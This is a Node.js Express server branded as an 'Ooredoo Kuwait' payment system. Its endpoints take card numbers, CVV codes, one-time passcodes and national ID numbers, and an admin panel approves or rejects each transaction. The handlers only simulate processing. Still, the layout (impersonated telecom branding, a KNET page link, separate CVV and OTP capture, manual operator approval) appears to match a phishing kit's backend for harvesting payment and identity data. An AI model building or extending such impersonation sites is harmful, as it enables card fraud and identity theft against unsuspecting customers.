const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the public directory
const publicPath = path.join(__dirname, '../public');
app.use(express.static(publicPath));

// API Routes
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', message: 'Server is running' });
});

// Payment API
app.post('/api/payment', (req, res) => {
  const { amount, method, cardNumber } = req.body;
  
  if (!amount || !method) {
    return res.status(400).json({ error: 'Missing required fields' });
  }

  // Simulate payment processing
  const transactionId = 'TXN-' + Date.now();
  
  res.json({
    success: true,
    transactionId,
    amount,
    method,
    status: 'pending',
    message: 'Payment initiated successfully'
  });
});

// OTP Verification
app.post('/api/verify-otp', (req, res) => {
  const { otp, phone } = req.body;
  
  if (!otp || !phone) {
    return res.status(400).json({ error: 'Missing OTP or phone number' });
  }

  // Simulate OTP verification
  const isValid = otp === '123456'; // Demo OTP
  
  res.json({
    success: isValid,
    message: isValid ? 'OTP verified successfully' : 'Invalid OTP',
    phone
  });
});

// CVV Verification
app.post('/api/verify-cvv', (req, res) => {
  const { cvv, cardNumber } = req.body;
  
  if (!cvv || !cardNumber) {
    return res.status(400).json({ error: 'Missing CVV or card number' });
  }

  // Simulate CVV verification
  const isValid = cvv.length === 3 || cvv.length === 4;
  
  res.json({
    success: isValid,
    message: isValid ? 'CVV verified successfully' : 'Invalid CVV',
    cardNumber: cardNumber.slice(-4)
  });
});

// Hawety (National ID) Verification
app.post('/api/verify-hawety', (req, res) => {
  const { nationalId, name } = req.body;
  
  if (!nationalId || !name) {
    return res.status(400).json({ error: 'Missing national ID or name' });
  }

  // Simulate Hawety verification
  const isValid = nationalId.length >= 10;
  
  res.json({
    success: isValid,
    message: isValid ? 'National ID verified successfully' : 'Invalid National ID',
    name,
    nationalId: nationalId.slice(-4)
  });
});

// Admin Dashboard API
app.get('/api/admin/transactions', (req, res) => {
  // Return mock transaction data
  res.json({
    success: true,
    transactions: [
      {
        id: 'TXN-001',
        amount: 50,
        method: 'KNET',
        status: 'completed',
        date: new Date().toISOString()
      },
      {
        id: 'TXN-002',
        amount: 100,
        method: 'CVV',
        status: 'pending',
        date: new Date().toISOString()
      }
    ]
  });
});

// Admin Approve/Reject
app.post('/api/admin/transaction/:id/approve', (req, res) => {
  const { id } = req.params;
  
  res.json({
    success: true,
    message: `Transaction ${id} approved`,
    status: 'completed'
  });
});

app.post('/api/admin/transaction/:id/reject', (req, res) => {
  const { id } = req.params;
  
  res.json({
    success: true,
    message: `Transaction ${id} rejected`,
    status: 'rejected'
  });
});

// Serve index.html for all other routes (SPA fallback)
app.get('*', (req, res) => {
  const indexPath = path.join(publicPath, 'index.html');
  
  // Check if the file exists
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    // If index.html doesn't exist, return a simple HTML page
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ooredoo Kuwait - Payment System</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          }
          .container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
          }
          h1 {
            color: #333;
            margin: 0 0 10px 0;
          }
          p {
            color: #666;
            margin: 10px 0;
          }
          .links {
            margin-top: 20px;
          }
          a {
            display: inline-block;
            margin: 10px;
            padding: 10px 20px;
            background: #667eea;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            transition: background 0.3s;
          }
          a:hover {
            background: #764ba2;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>🇰🇼 Ooredoo Kuwait</h1>
          <p>Payment System</p>
          <p>Server is running successfully!</p>
          <div class="links">
            <a href="/knetpage.html">KNET Payment</a>
            <a href="/admin.html">Admin Dashboard</a>
            <a href="/api/health">Health Check</a>
          </div>
        </div>
      </body>
      </html>
    `);
  }
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Ooredoo Kuwait Payment System is running on port ${PORT}`);
  console.log(`📍 Public files path: ${publicPath}`);
  console.log(`🌐 Visit http://localhost:${PORT} to access the application`);
});

// Export for Vercel
module.exports = app;
